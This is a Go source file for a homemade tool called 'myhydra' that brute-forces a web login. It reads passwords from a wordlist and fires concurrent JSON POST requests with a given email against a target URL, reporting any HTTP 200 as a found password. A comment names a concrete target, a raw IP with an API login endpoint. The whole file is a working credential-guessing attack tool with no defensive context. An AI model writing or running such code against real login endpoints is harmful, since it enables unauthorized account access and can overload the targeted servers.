package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
)

const (
	ColorGreen = "\033[32m"
	ColorRed   = "\033[31m"
	ColorReset = "\033[0m"
	TextBold   = "\033[1m"
	TextUnbold = "\033[21m"
)

func main() {
	// Target URL and endpoint
	if len(os.Args) < 4 {
		fmt.Println("Usage: ./myhydra <targetURL> <email> <path_to_wordlist>")
		return
	}
	targetURL := os.Args[1]
	// "http://147.139.170.15/api/users?login=1"

	// Username or email for the login attempt
	username := os.Args[2]
	// "test@test.com"

	// Open wordlist file
	wordlistFile, err := os.Open(os.Args[3])
	if err != nil {
		fmt.Println("Error opening wordlist file:", err)
		return
	}
	defer wordlistFile.Close()

	// Read wordlist line by line
	scanner := bufio.NewScanner(wordlistFile)

	var wg sync.WaitGroup

	// Iterate over each password in the wordlist
	for scanner.Scan() {
		password := scanner.Text()

		wg.Add(1)

		go func(password string) {
			defer wg.Done()

			// Send POST request with username and password
			resp, err := http.Post(targetURL, "application/json", strings.NewReader(fmt.Sprintf(`{"email":"%s","password":"%s"}`, username, password)))
			if err != nil {
				fmt.Println("Error sending request:", err)
				return
			}
			defer resp.Body.Close()

			// Check response status code
			if resp.StatusCode == http.StatusOK {
				fmt.Printf("%sPassword Found!: %s (statusCode %s) %s\n", ColorGreen+TextBold, password, fmt.Sprint(resp.StatusCode), ColorReset)
				return
			}
			if resp.StatusCode != http.StatusOK {
				fmt.Printf("%sWrong Password!: %s (statusCode %s) %s\n", ColorRed, password, fmt.Sprint(resp.StatusCode), ColorReset)
			}

			// Uncomment the below line to print failed attempts
			// fmt.Printf("Failed attempt for password: %s\n", password)
		}(password)
	}

	wg.Wait()
}
